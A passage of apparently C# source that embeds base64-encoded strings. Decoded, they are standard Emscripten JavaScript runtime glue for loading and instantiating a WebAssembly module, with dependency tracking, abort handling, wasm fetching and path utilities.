SB7DQogICAgICAvLyBDaGVjayBmb3IgbWlzc2luZyBkZXBlbmRlbmNpZXMgZXZlcnkgZmV3IHNlY29uZHMNCiAgICAgIHJ1bkRlcGVuZGVuY3lXYXRjaGVyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7DQogICAgICAgIGlmIChBQk9SVCkgew0KICAgICAgICAgIGNsZWFySW50ZXJ2YWwocnVuRGVwZW5kZW5jeVdhdGNoZXIpOw0KICAgICAgICAgIHJ1bkRlcGVuZGVuY3lXYXRjaGVyID0gbnVsbDsNCiAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICAgICAgdmFyIHNob3duID0gZmFsc2U7DQogICAgICAgIGZvciAodmFyIGRlcCBpbiBydW5EZXBlbmRlbmN5VHJhY2tpbmcpIHsNCiAgICAgICAgICBpZiAoIXNob3duKSB7DQogICAgICAgICAgICBzaG93biA9IHRydWU7DQogICAgICAgICAgICBlcnIoJ3N0aWxsIHdhaXRpbmcgb24gcnVuIGRlcGVuZGVuY2llczonKTsNCiAgICAgICAgICB9DQogICAgICAgICAgZXJyKCdkZXBlbmRlbmN5OiAnICsgZGVwKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoc2hvd24pIHsNCiAgICAgICAgICBlcnIoJyhlbmQgb2YgbGlzdCknKTsNCiAgICAgICAgfQ0KICAgICAgfSwgMTAwMDApOw0KICAgIH0NCiAgfSBlbHNlIHsNCiAgICBlcnIoJ3dhcm5pbmc6IHJ1biBkZXBlbmRlbmN5IGFkZGVkIHdpdGhvdXQgSUQnKTsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiByZW1vdmVSdW5EZXBlbmRlbmN5KGlkKSB7DQogIHJ1bkRlcGVuZGVuY2llcy0tOw0KDQogIGlmIChNb2R1bGVbJ21vbml0b3JSdW5EZXBlbmRlbmNpZXMnXSkgew0KICAgIE1vZHVsZVsnbW9uaXRvclJ1bkRlcGVuZGVuY2llcyddKHJ1bkRlcGVuZGVuY2llcyk7DQogIH0NCg0KICBpZiAoaWQpIHsNCiAgICBhc3NlcnQocnVuRGVwZW5kZW5jeVRyYWNraW5nW2lkXSk7DQogICAgZGVsZXRlIHJ1bkRlcGVuZGVuY3lUcmFja2luZ1tpZF07DQogIH0gZWxzZSB7DQogICAgZXJyKCd3YXJuaW5nOiBydW4gZGVwZW5kZW5jeSByZW1vdmVkIHdpdGhvdXQgSUQnKTsNCiAgfQ0KICBpZiAocnVuRGVwZW5kZW5jaWVzID09IDApIHsNCiAgICBpZiAocnVuRGVwZW5kZW5jeVdhdGNoZXIgIT09IG51bGwpIHsNCiAgICAgIGNsZWFySW50ZXJ2YWwocnVuRGVwZW5kZW5jeVdhdGNoZXIpOw0KICAgICAgcnVuRGVwZW5kZW5jeVdhdGNoZXIgPSBudWxsOw0KICAgIH0NCiAgICBpZiAoZGVwZW5kZW5jaWVzRnVsZmlsbGVkKSB7DQogICAgICB2YXIgY2FsbGJhY2sgPSBkZXBlbmRlbmNpZXNGdWxmaWxsZWQ7DQogICAgICBkZXBlbmRlbmNpZXNGdWxmaWxsZWQgPSBudWxsOw0KICAgICAgY2FsbGJhY2soKTsgLy8gY2FuIGFkZCBhbm90aGVyIGRlcGVuZGVuY2llc0Z1bGZpbGxlZA0KICAgIH0NCiAgfQ0KfQ0KDQpNb2R1bGVbInByZWxvYWRlZEltYWdlcyJdID0ge307IC8vIG1hcHMgdXJsIHRvIGltYWdlIGRhdGENCk1vZHVsZVsicHJlbG9hZGVkQXVkaW9zIl0gPSB7fTsgLy8gbWFwcyB1cmwgdG8gYXVkaW8gZGF0YQ0KDQovKiogQHBhcmFtIHtzdHJpbmd8bnVtYmVyPX0gd2hhdCAqLw0KZnVuY3Rpb24gYWJvcnQod2hhdCkgew0KICBpZiAoTW9kdWxlWydvbkFib3J0J10pIHsNCiAgICBNb2R1bGVbJ29uQWJvcnQnXSh3aGF0KTsNCiAgfQ0KDQogIHdoYXQgKz0gJyc7DQogIG91dCh3aGF0KTsNCiAgZXJyKHdoYXQpOw0KDQogIEFCT1JUID0gdHJ1ZTsNCiAgRVhJVFNUQVRVUyA9IDE7DQoNCiAgdmFyIG91dHB1dCA9ICdhYm9ydCgnICsgd2hhdCArICcpIGF0ICcgKyBzdGFja1RyYWNlKCk7DQogIHdoYXQgPSBvdXRwdXQ7DQoNCiAgLy8gVGhyb3cgYSB3YXNtIHJ1bnRpbWUgZXJyb3IsIGJlY2F1c2UgYSBKUyBlcnJvciBtaWdodCBiZSBzZWVuIGFzIGEgZm9yZWlnbg0KICAvLyBleGNlcHRpb24sIHdoaWNoIG1lYW5zIHdlJ2QgcnVuIGRlc3RydWN0b3JzIG9uIGl0LiBXZSBuZWVkIHRoZSBlcnJvciB0bw0KICAvLyBzaW1wbHkgbWFrZSB0aGUgcHJvZ3JhbSBzdG9wLg0KICB0aHJvdyBuZXcgV2ViQXNzZW1ibHkuUnVudGltZUVycm9yKHdoYXQpOw0KfQ0KDQoNCnZhciBtZW1vcnlJbml0aWFsaXplciA9IG51bGw7DQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQpmdW5jdGlvbiBoYXNQcmVmaXgoc3RyLCBwcmVmaXgpIHsNCiAgcmV0dXJuIFN0cmluZy5wcm90b3R5cGUuc3RhcnRzV2l0aCA/DQogICAgICBzdHIuc3RhcnRzV2l0aChwcmVmaXgpIDoNCiAgICAgIHN0ci5pbmRleE9mKHByZWZpeCkgPT09IDA7DQp9DQoNCi8vIFByZWZpeCBvZiBkYXRhIFVSSXMgZW1pdHRlZCBieSBTSU5HTEVfRklMRSBhbmQgcmVsYXRlZCBvcHRpb25zLg0KdmFyIGRhdGFVUklQcmVmaXggPSAnZGF0YTphcHBsaWNhdGlvbi9vY3RldC1zdHJlYW07YmFzZTY0LCc7DQoNCi8vIEluZGljYXRlcyB3aGV0aGVyIGZpbGVuYW1lIGlzIGEgYmFzZTY0IGRhdGEgVVJJLg0KZnVuY3Rpb24gaXNEYXRhVVJJKGZpbGVuYW1lKSB7DQogIHJldHVybiBoYXNQcmVmaXgoZmlsZW5hbWUsIGRhdGFVUklQcmVmaXgpOw0KfQ0KDQp2YXIgZmlsZVVSSVByZWZpeCA9ICJmaWxlOi8vIjsNCg0KLy8gSW5kaWNhdGVzIHdoZXRoZXIgZmlsZW5hbWUgaXMgZGVsaXZlcmVkIHZpYSBmaWxlIHByb3RvY29sIChhcyBvcHBvc2VkIHRvIGh0dHAvaHR0cHMpDQpmdW5jdGlvbiBpc0ZpbGVVUkkoZmlsZW5hbWUpIHsNCiAgcmV0dXJuIGhhc1ByZWZpeChmaWxlbmFtZSwgZmlsZVVSSVByZWZpeCk7DQp9DQoNCg0KDQpmdW5jdGlvbiBjcmVhdGVFeHBvcnRXcmFwcGVyKG5hbWUsIGZpeGVkYXNtKSB7DQogIHJldHVybiBmdW5jdGlvbigpIHsNCiAgICB2YXIgZGlzcGxheU5hbWUgPSBuYW1lOw0KICAgIHZhciBhc20gPSBmaXhlZGFzbTsNCiAgICBpZiAoIWZpeGVkYXNtKSB7DQogICAgICBhc20gPSBNb2R1bGVbJ2FzbSddOw0KICAgIH0NCiAgICBhc3NlcnQocnVudGltZUluaXRpYWxpemVkLCAnbmF0aXZlIGZ1bmN0aW9uIGAnICsgZGlzcGxheU5hbWUgKyAnYCBjYWxsZWQgYmVmb3JlIHJ1bnRpbWUgaW5pdGlhbGl6YXRpb24nKTsNCiAgICBhc3NlcnQoIXJ1bnRpbWVFeGl0ZWQsICduYXRpdmUgZnVuY3Rpb24gYCcgKyBkaXNwbGF5TmFtZSArICdgIGNhbGxlZCBhZnRlciBydW50aW1lIGV4aXQgKHVzZSBOT19FWElUX1JVTlRJTUUgdG8ga2VlcCBpdCBhbGl2ZSBhZnRlciBtYWluKCkgZXhpdHMpJyk7DQogICAgaWYgKCFhc21bbmFtZV0pIHsNCiAgICAgIGFzc2VydChhc21bbmFtZV0sICdleHBvcnRlZCBuYXRpdmUgZnVuY3Rpb24gYCcgKyBkaXNwbGF5TmFtZSArICdgIG5vdCBmb3VuZCcpOw0KICAgIH0NCiAgICByZXR1cm4gYXNtW25hbWVdLmFwcGx5KG51bGwsIGFyZ3VtZW50cyk7DQogIH07DQp9DQoNCnZhciB3YXNtQmluYXJ5RmlsZSA9ICc=";
        string js2 = @"JzsNCmlmICghaXNEYXRhVVJJKHdhc21CaW5hcnlGaWxlKSkgew0KICB3YXNtQmluYXJ5RmlsZSA9IGxvY2F0ZUZpbGUod2FzbUJpbmFyeUZpbGUpOw0KfQ0KDQpmdW5jdGlvbiBnZXRCaW5hcnkoKSB7DQogIHRyeSB7DQogICAgaWYgKHdhc21CaW5hcnkpIHsNCiAgICAgIHJldHVybiBuZXcgVWludDhBcnJheSh3YXNtQmluYXJ5KTsNCiAgICB9DQoNCiAgICBpZiAocmVhZEJpbmFyeSkgew0KICAgICAgcmV0dXJuIHJlYWRCaW5hcnkod2FzbUJpbmFyeUZpbGUpOw0KICAgIH0gZWxzZSB7DQogICAgICB0aHJvdyAiYm90aCBhc3luYyBhbmQgc3luYyBmZXRjaGluZyBvZiB0aGUgd2FzbSBmYWlsZWQiOw0KICAgIH0NCiAgfQ0KICBjYXRjaCAoZXJyKSB7DQogICAgYWJvcnQoZXJyKTsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBnZXRCaW5hcnlQcm9taXNlKCkgew0KICAvLyBJZiB3ZSBkb24ndCBoYXZlIHRoZSBiaW5hcnkgeWV0LCBhbmQgaGF2ZSB0aGUgRmV0Y2ggYXBpLCB1c2UgdGhhdDsNCiAgLy8gaW4gc29tZSBlbnZpcm9ubWVudHMsIGxpa2UgRWxlY3Ryb24ncyByZW5kZXIgcHJvY2VzcywgRmV0Y2ggYXBpIG1heSBiZSBwcmVzZW50LCBidXQgaGF2ZSBhIGRpZmZlcmVudCBjb250ZXh0IHRoYW4gZXhwZWN0ZWQsIGxldCdzIG9ubHkgdXNlIGl0IG9uIHRoZSBXZWINCiAgaWYgKCF3YXNtQmluYXJ5ICYmIChFTlZJUk9OTUVOVF9JU19XRUIgfHwgRU5WSVJPTk1FTlRfSVNfV09SS0VSKSAmJiB0eXBlb2YgZmV0Y2ggPT09ICdmdW5jdGlvbicNCiAgICAgIC8vIExldCdzIG5vdCB1c2UgZmV0Y2ggdG8gZ2V0IG9iamVjdHMgb3ZlciBmaWxlOi8vIGFzIGl0J3MgbW9zdCBsaWtlbHkgQ29yZG92YSB3aGljaCBkb2Vzbid0IHN1cHBvcnQgZmV0Y2ggZm9yIGZpbGU6Ly8NCiAgICAgICYmICFpc0ZpbGVVUkkod2FzbUJpbmFyeUZpbGUpDQogICAgICApIHsNCiAgICByZXR1cm4gZmV0Y2god2FzbUJpbmFyeUZpbGUsIHsgY3JlZGVudGlhbHM6ICdzYW1lLW9yaWdpbicgfSkudGhlbihmdW5jdGlvbihyZXNwb25zZSkgew0KICAgICAgaWYgKCFyZXNwb25zZVsnb2snXSkgew0KICAgICAgICB0aHJvdyAiZmFpbGVkIHRvIGxvYWQgd2FzbSBiaW5hcnkgZmlsZSBhdCAnIiArIHdhc21CaW5hcnlGaWxlICsgIiciOw0KICAgICAgfQ0KICAgICAgcmV0dXJuIHJlc3BvbnNlWydhcnJheUJ1ZmZlciddKCk7DQogICAgfSkuY2F0Y2goZnVuY3Rpb24gKCkgew0KICAgICAgcmV0dXJuIGdldEJpbmFyeSgpOw0KICAgIH0pOw0KICB9DQogIC8vIE90aGVyd2lzZSwgZ2V0QmluYXJ5IHNob3VsZCBiZSBhYmxlIHRvIGdldCBpdCBzeW5jaHJvbm91c2x5DQogIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsNCiAgICByZXNvbHZlKGdldEJpbmFyeSgpKTsNCiAgfSk7DQp9DQoNCg0KDQovLyBDcmVhdGUgdGhlIHdhc20gaW5zdGFuY2UuDQovLyBSZWNlaXZlcyB0aGUgd2FzbSBpbXBvcnRzLCByZXR1cm5zIHRoZSBleHBvcnRzLg0KZnVuY3Rpb24gY3JlYXRlV2FzbSgpIHsNCiAgLy8gcHJlcGFyZSBpbXBvcnRzDQogIHZhciBpbmZvID0gew0KICAgICdlbnYnOiBhc21MaWJyYXJ5QXJnLA0KICAgICd3YXNpX3NuYXBzaG90X3ByZXZpZXcxJzogYXNtTGlicmFyeUFyZw0KICB9Ow0KICAvLyBMb2FkIHRoZSB3YXNtIG1vZHVsZSBhbmQgY3JlYXRlIGFuIGluc3RhbmNlIG9mIHVzaW5nIG5hdGl2ZSBzdXBwb3J0IGluIHRoZSBKUyBlbmdpbmUuDQogIC8vIGhhbmRsZSBhIGdlbmVyYXRlZCB3YXNtIGluc3RhbmNlLCByZWNlaXZpbmcgaXRzIGV4cG9ydHMgYW5kDQogIC8vIHBlcmZvcm1pbmcgb3RoZXIgbmVjZXNzYXJ5IHNldHVwDQogIC8qKiBAcGFyYW0ge1dlYkFzc2VtYmx5Lk1vZHVsZT19IG1vZHVsZSovDQogIGZ1bmN0aW9uIHJlY2VpdmVJbnN0YW5jZShpbnN0YW5jZSwgbW9kdWxlKSB7DQogICAgdmFyIGV4cG9ydHMgPSBpbnN0YW5jZS5leHBvcnRzOw0KICAgIE1vZHVsZVsnYXNtJ10gPSBleHBvcnRzOw0KICAgIHJlbW92ZVJ1bkRlcGVuZGVuY3koJ3dhc20taW5zdGFudGlhdGUnKTsNCiAgfQ0KICAvLyB3ZSBjYW4ndCBydW4geWV0IChleGNlcHQgaW4gYSBwdGhyZWFkLCB3aGVyZSB3ZSBoYXZlIGEgY3VzdG9tIHN5bmMgaW5zdGFudGlhdG9yKQ0KICBhZGRSdW5EZXBlbmRlbmN5KCd3YXNtLWluc3RhbnRpYXRlJyk7DQoNCg0KICAvLyBBc3luYyBjb21waWxhdGlvbiBjYW4gYmUgY29uZnVzaW5nIHdoZW4gYW4gZXJyb3Igb24gdGhlIHBhZ2Ugb3ZlcndyaXRlcyBNb2R1bGUNCiAgLy8gKGZvciBleGFtcGxlLCBpZiB0aGUgb3JkZXIgb2YgZWxlbWVudHMgaXMgd3JvbmcsIGFuZCB0aGUgb25lIGRlZmluaW5nIE1vZHVsZSBpcw0KICAvLyBsYXRlciksIHNvIHdlIHNhdmUgTW9kdWxlIGFuZCBjaGVjayBpdCBsYXRlci4NCiAgdmFyIHRydWVNb2R1bGUgPSBNb2R1bGU7DQogIGZ1bmN0aW9uIHJlY2VpdmVJbnN0YW50aWF0ZWRTb3VyY2Uob3V0cHV0KSB7DQogICAgLy8gJ291dHB1dCcgaXMgYSBXZWJBc3NlbWJseUluc3RhbnRpYXRlZFNvdXJjZSBvYmplY3Qgd2hpY2ggaGFzIGJvdGggdGhlIG1vZHVsZSBhbmQgaW5zdGFuY2UuDQogICAgLy8gcmVjZWl2ZUluc3RhbmNlKCkgd2lsbCBzd2FwIGluIHRoZSBleHBvcnRzICh0byBNb2R1bGUuYXNtKSBzbyB0aGV5IGNhbiBiZSBjYWxsZWQNCiAgICBhc3NlcnQoTW9kdWxlID09PSB0cnVlTW9kdWxlLCAndGhlIE1vZHVsZSBvYmplY3Qgc2hvdWxkIG5vdCBiZSByZXBsYWNlZCBkdXJpbmcgYXN5bmMgY29tcGlsYXRpb24gLSBwZXJoYXBzIHRoZSBvcmRlciBvZiBIVE1MIGVsZW1lbnRzIGlzIHdyb25nPycpOw0KICAgIHRydWVNb2R1bGUgPSBudWxsOw0KICAgIC8vIFRPRE86IER1ZSB0byBDbG9zdXJlIHJlZ3Jlc3Npb24gaHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jbG9zdXJlLWNvbXBpbGVyL2lzc3Vlcy8zMTkzLCB0aGUgYWJvdmUgbGluZSBubyBsb25nZXIgb3B0aW1pemVzIG91dCBkb3duIHRvIHRoZSBmb2xsb3dpbmcgbGluZS4NCiAgICAvLyBXaGVuIHRoZSByZWdyZXNzaW9uIGlzIGZpeGVkLCBjYW4gcmVzdG9yZSB0aGUgYWJvdmUgVVNFX1BUSFJFQURTLWVuYWJsZWQgcGF0aC4NCiAgICByZWNlaXZlSW5zdGFuY2Uob3V0cHV0WydpbnN0YW5jZSddKTsNCiAgfQ0KDQoNCiAgZnVuY3Rpb24gaW5zdGFudGlhdGVBcnJheUJ1ZmZlcihyZWNlaXZlcikgew0KICAgIHJldHVybiBnZXRCaW5hcnlQcm9taXNlKCkudGhlbihmdW5jdGlvbihiaW5hcnkpIHsNCiAgICAgIHJldHVybiBXZWJBc3NlbWJseS5pbnN0YW50aWF0ZShiaW5hcnksIGluZm8pOw0KICAgIH0pLnRoZW4ocmVjZWl2ZXIsIGZ1bmN0aW9uKHJlYXNvbikgew0KICAgICAgZXJyKCdmYWlsZWQgdG8gYXN5bmNocm9ub3VzbHkgcHJlcGFyZSB3YXNtOiAnICsgcmVhc29uKTsNCiAgICAgIGFib3J0KHJlYXNvbik7DQogICAgfSk7DQogIH0NCg0KICAvLyBQcmVmZXIgc3RyZWFtaW5nIGluc3RhbnRpYXRpb24gaWYgYXZhaWxhYmxlLg0KICBmdW5jdGlvbiBpbnN0YW50aWF0ZUFzeW5jKCkgew0KICAgIGlmICghd2FzbUJpbmFyeSAmJg0KICAgICAgICB0eXBlb2YgV2ViQXNzZW1ibHkuaW5zdGFudGlhdGVTdHJlYW1pbmcgPT09ICdmdW5jdGlvbicgJiYNCiAgICAgICAgIWlzRGF0YVVSSSh3YXNtQmluYXJ5RmlsZSkgJiYNCiAgICAgICAgLy8gRG9uJ3QgdXNlIHN0cmVhbWluZyBmb3IgZmlsZTovLyBkZWxpdmVyZWQgb2JqZWN0cyBpbiBhIHdlYnZpZXcsIGZldGNoIHRoZW0gc3luY2hyb25vdXNseS4NCiAgICAgICAgIWlzRmlsZVVSSSh3YXNtQmluYXJ5RmlsZSkgJiYNCiAgICAgICAgdHlwZW9mIGZldGNoID09PSAnZnVuY3Rpb24nKSB7DQogICAgICBmZXRjaCh3YXNtQmluYXJ5RmlsZSwgeyBjcmVkZW50aWFsczogJ3NhbWUtb3JpZ2luJyB9KS50aGVuKGZ1bmN0aW9uIChyZXNwb25zZSkgew0KICAgICAgICB2YXIgcmVzdWx0ID0gV2ViQXNzZW1ibHkuaW5zdGFudGlhdGVTdHJlYW1pbmcocmVzcG9uc2UsIGluZm8pOw0KICAgICAgICByZXR1cm4gcmVzdWx0LnRoZW4ocmVjZWl2ZUluc3RhbnRpYXRlZFNvdXJjZSwgZnVuY3Rpb24ocmVhc29uKSB7DQogICAgICAgICAgICAvLyBXZSBleHBlY3QgdGhlIG1vc3QgY29tbW9uIGZhaWx1cmUgY2F1c2UgdG8gYmUgYSBiYWQgTUlNRSB0eXBlIGZvciB0aGUgYmluYXJ5LA0KICAgICAgICAgICAgLy8gaW4gd2hpY2ggY2FzZSBmYWxsaW5nIGJhY2sgdG8gQXJyYXlCdWZmZXIgaW5zdGFudGlhdGlvbiBzaG91bGQgd29yay4NCiAgICAgICAgICAgIGVycignd2FzbSBzdHJlYW1pbmcgY29tcGlsZSBmYWlsZWQ6ICcgKyByZWFzb24pOw0KICAgICAgICAgICAgZXJyKCdmYWxsaW5nIGJhY2sgdG8gQXJyYXlCdWZmZXIgaW5zdGFudGlhdGlvbicpOw0KICAgICAgICAgICAgcmV0dXJuIGluc3RhbnRpYXRlQXJyYXlCdWZmZXIocmVjZWl2ZUluc3RhbnRpYXRlZFNvdXJjZSk7DQogICAgICAgICAgfSk7DQogICAgICB9KTsNCiAgICB9IGVsc2Ugew0KICAgICAgcmV0dXJuIGluc3RhbnRpYXRlQXJyYXlCdWZmZXIocmVjZWl2ZUluc3RhbnRpYXRlZFNvdXJjZSk7DQogICAgfQ0KICB9DQogIC8vIFVzZXIgc2hlbGwgcGFnZXMgY2FuIHdyaXRlIHRoZWlyIG93biBNb2R1bGUuaW5zdGFudGlhdGVXYXNtID0gZnVuY3Rpb24oaW1wb3J0cywgc3VjY2Vzc0NhbGxiYWNrKSBjYWxsYmFjaw0KICAvLyB0byBtYW51YWxseSBpbnN0YW50aWF0ZSB0aGUgV2FzbSBtb2R1bGUgdGhlbXNlbHZlcy4gVGhpcyBhbGxvd3MgcGFnZXMgdG8gcnVuIHRoZSBpbnN0YW50aWF0aW9uIHBhcmFsbGVsDQogIC8vIHRvIGFueSBvdGhlciBhc3luYyBzdGFydHVwIGFjdGlvbnMgdGhleSBhcmUgcGVyZm9ybWluZy4NCiAgaWYgKE1vZHVsZVsnaW5zdGFudGlhdGVXYXNtJ10pIHsNCiAgICB0cnkgew0KICAgICAgdmFyIGV4cG9ydHMgPSBNb2R1bGVbJ2luc3RhbnRpYXRlV2FzbSddKGluZm8sIHJlY2VpdmVJbnN0YW5jZSk7DQogICAgICByZXR1cm4gZXhwb3J0czsNCiAgICB9IGNhdGNoKGUpIHsNCiAgICAgIGVycignTW9kdWxlLmluc3RhbnRpYXRlV2FzbSBjYWxsYmFjayBmYWlsZWQgd2l0aCBlcnJvcjogJyArIGUpOw0KICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgfQ0KDQogIGluc3RhbnRpYXRlQXN5bmMoKTsNCiAgcmV0dXJuIHt9OyAvLyBubyBleHBvcnRzIHlldDsgd2UnbGwgZmlsbCB0aGVtIGluIGxhdGVyDQp9DQoNCg0KLy8gR2xvYmFscyB1c2VkIGJ5IEpTIGk2NCBjb252ZXJzaW9ucw0KdmFyIHRlbXBEb3VibGU7DQp2YXIgdGVtcEk2NDsNCg0KLy8gPT09IEJvZHkgPT09DQoNCnZhciBBU01fQ09OU1RTID0gew0KICANCn07DQoNCg0KDQoNCi8vIFNUQVRJQ1RPUCA9IFNUQVRJQ19CQVNFICsgMjA2NzI7DQovKiBnbG9iYWwgaW5pdGlhbGl6ZXJzICovICBfX0FUSU5JVF9fLnB1c2goeyBmdW5jOiBmdW5jdGlvbigpIHsgX19fd2FzbV9jYWxsX2N0b3JzKCkgfSB9KTsNCg0KDQoNCg0KLyogbm8gbWVtb3J5IGluaXRpYWxpemVyICovDQovLyB7e1BSRV9MSUJSQVJZfX0NCg0KDQogIGZ1bmN0aW9uIGFib3J0U3RhY2tPdmVyZmxvdyhhbGxvY1NpemUpIHsNCiAgICAgIGFib3J0KCdTdGFjayBvdmVyZmxvdyEgQXR0ZW1wdGVkIHRvIGFsbG9jYXRlICcgKyBhbGxvY1NpemUgKyAnIGJ5dGVzIG9uIHRoZSBzdGFjaywgYnV0IHN0YWNrIGhhcyBvbmx5ICcgKyAoU1RBQ0tfTUFYIC0gc3RhY2tTYXZlKCkgKyBhbGxvY1NpemUpICsgJyBieXRlcyBhdmFpbGFibGUhJyk7DQogICAgfQ0KDQogIGZ1bmN0aW9uIGRlbWFuZ2xlKGZ1bmMpIHsNCiAgICAgIHdhcm5PbmNlKCd3YXJuaW5nOiBidWlsZCB3aXRoICAtcyBERU1BTkdMRV9TVVBQT1JUPTEgIHRvIGxpbmsgaW4gbGliY3h4YWJpIGRlbWFuZ2xpbmcnKTsNCiAgICAgIHJldHVybiBmdW5jOw0KICAgIH0NCg0KICBmdW5jdGlvbiBkZW1hbmdsZUFsbCh0ZXh0KSB7DQogICAgICB2YXIgcmVnZXggPQ0KICAgICAgICAvXGJfWltcd1xkX10rL2c7DQogICAgICByZXR1cm4gdGV4dC5yZXBsYWNlKHJlZ2V4LA0KICAgICAgICBmdW5jdGlvbih4KSB7DQogICAgICAgICAgdmFyIHkgPSBkZW1hbmdsZSh4KTsNCiAgICAgICAgICByZXR1cm4geCA9PT0geSA/IHggOiAoeSArICcgWycgKyB4ICsgJ10nKTsNCiAgICAgICAgfSk7DQogICAgfQ0KDQogIGZ1bmN0aW9uIGpzU3RhY2tUcmFjZSgpIHsNCiAgICAgIHZhciBlcnIgPSBuZXcgRXJyb3IoKTsNCiAgICAgIGlmICghZXJyLnN0YWNrKSB7DQogICAgICAgIC8vIElFMTArIHNwZWNpYWwgY2FzZXM6IEl0IGRvZXMgaGF2ZSBjYWxsc3RhY2sgaW5mbywgYnV0IGl0IGlzIG9ubHkgcG9wdWxhdGVkIGlmIGFuIEVycm9yIG9iamVjdCBpcyB0aHJvd24sDQogICAgICAgIC8vIHNvIHRyeSB0aGF0IGFzIGEgc3BlY2lhbC1jYXNlLg0KICAgICAgICB0cnkgew0KICAgICAgICAgIHRocm93IG5ldyBFcnJvcigpOw0KICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICBlcnIgPSBlOw0KICAgICAgICB9DQogICAgICAgIGlmICghZXJyLnN0YWNrKSB7DQogICAgICAgICAgcmV0dXJuICcobm8gc3RhY2sgdHJhY2UgYXZhaWxhYmxlKSc7DQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIHJldHVybiBlcnIuc3RhY2sudG9TdHJpbmcoKTsNCiAgICB9DQoNCiAgZnVuY3Rpb24gc3RhY2tUcmFjZSgpIHsNCiAgICAgIHZhciBqcyA9IGpzU3RhY2tUcmFjZSgpOw0KICAgICAgaWYgKE1vZHVsZVsnZXh0cmFTdGFja1RyYWNlJ10pIGpzICs9ICdcbicgKyBNb2R1bGVbJ2V4dHJhU3RhY2tUcmFjZSddKCk7DQogICAgICByZXR1cm4gZGVtYW5nbGVBbGwoanMpOw0KICAgIH0NCg0KICANCiAgZnVuY3Rpb24gX2F0ZXhpdChmdW5jLCBhcmcpIHsNCiAgICAgIHdhcm5PbmNlKCdhdGV4aXQoKSBjYWxsZWQsIGJ1dCBFWElUX1JVTlRJTUUgaXMgbm90IHNldCwgc28gYXRleGl0cygpIHdpbGwgbm90IGJlIGNhbGxlZC4gc2V0IEVYSVRfUlVOVElNRSB0byAxIChzZWUgdGhlIEZBUSknKTsNCiAgICAgIF9fQVRFWElUX18udW5zaGlmdCh7IGZ1bmM6IGZ1bmMsIGFyZzogYXJnIH0pOw0KICAgIH1mdW5jdGlvbiBfX19jeGFfYXRleGl0KGEwLGExDQogICkgew0KICByZXR1cm4gX2F0ZXhpdChhMCxhMSk7DQogIH0NCg0KICBmdW5jdGlvbiBfX19oYW5kbGVfc3RhY2tfb3ZlcmZsb3coKSB7DQogICAgICBhYm9ydCgnc3RhY2sgb3ZlcmZsb3cnKQ0KICAgIH0NCg0KICANCiAgZnVuY3Rpb24gc2V0RXJyTm8odmFsdWUpIHsNCiAgICAgIEhFQVAzMlsoKF9fX2Vycm5vX2xvY2F0aW9uKCkpPj4yKV09dmFsdWU7DQogICAgICByZXR1cm4gdmFsdWU7DQogICAgfWZ1bmN0aW9uIF9fX21hcF9maWxlKHBhdGhuYW1lLCBzaXplKSB7DQogICAgICBzZXRFcnJObyg2Myk7DQogICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogIA0KICANCiAgDQogIHZhciBQQVRIPXtzcGxpdFBhdGg6ZnVuY3Rpb24oZmlsZW5hbWUpIHsNCiAgICAgICAgdmFyIHNwbGl0UGF0aFJlID0gL14oXC8/fCkoW1xzXFNdKj8pKCg/OlwuezEsMn18W15cL10rP3wpKFwuW14uXC9dKnwpKSg/OltcL10qKSQvOw0KICAgICAgICByZXR1cm4gc3BsaXRQYXRoUmUuZXhlYyhmaWxlbmFtZSkuc2xpY2UoMSk7DQogICAgICB9LG5vcm1hbGl6ZUFycmF5OmZ1bmN0aW9uKHBhcnRzLCBhbGxvd0Fib3ZlUm9vdCkgew0KICAgICAgICAvLyBpZiB0aGUgcGF0aCB0cmllcyB0byBnbyBhYm92ZSB0aGUgcm9vdCwgYHVwYCBlbmRzIHVwID4gMA0KICAgICAgICB2YXIgdXAgPSAwOw0KICAgICAgICBmb3IgKHZhciBpID0gcGFydHMubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHsNCiAgICAgICAgICB2YXIgbGFzdCA9IHBhcnRzW2ldOw0KICAgICAgICAgIGlmIChsYXN0ID09PSAnLicpIHsNCiAgICAgICAgICAgIHBhcnRzLnNwbGljZShpLCAxKTsNCiAgICAgICAgICB9IGVsc2UgaWYgKGxhc3QgPT09ICcuLicpIHsNCiAgICAgICAgICAgIHBhcnRzLnNwbGljZShpLCAxKTsNCiAgICAgICAgICAgIHVwKys7DQogICAgICAgICAgfSBlbHNlIGlmICh1cCkgew0KICAgICAgICAgICAgcGFydHMuc3BsaWNlKGksIDEpOw0KICAgICAgICAgICAgdXAtLTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgLy8gaWYgdGhlIHBhdGggaXMgYWxsb3dlZCB0byBnbyBhYm92ZSB0aGUgcm9vdCwgcmVzdG9yZSBsZWFkaW5nIC4ucw0KICAgICAgICBpZiAoYWxsb3dBYm92ZVJvb3QpIHsNCiAgICAgICAgICBmb3IgKDsgdXA7IHVwLS0pIHsNCiAgICAgICAgICAgIHBhcnRzLnVuc2hpZnQoJy4uJyk7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBwYXJ0czsNCiAgICAgIH0sbm9ybWFsaXplOmZ1bmN0aW9uKHBhdGgpIHsNCiAgICAgICAgdmFyIGlzQWJzb2x1dGUgPSBwYXRoLmNoYXJBdCgwKSA9PT0gJy8nLA0KICAgICAgICAgICAgdHJhaWxpbmdTbGFzaCA9IHBhdGguc3Vic3RyKC0xKSA9PT0gJy8nOw0KICAgICAgICAvLyBOb3JtYWxpemUgdGhlIHBhdGgNCiAgICAgICAgcGF0aCA9IFBBVEgubm9ybWFsaXplQXJyYXkocGF0aC5zcGxpdCgnLycpLmZpbHRlcihmdW5jdGlvbihwKSB7DQogICAgICAgICAgcmV0dXJuICEhcDsNCiAgICAgICAgfSksICFpc0Fic29sdXRlKS5qb2luKCcvJyk7DQogICAgICAgIGlmICghcGF0aCAmJiAhaXNB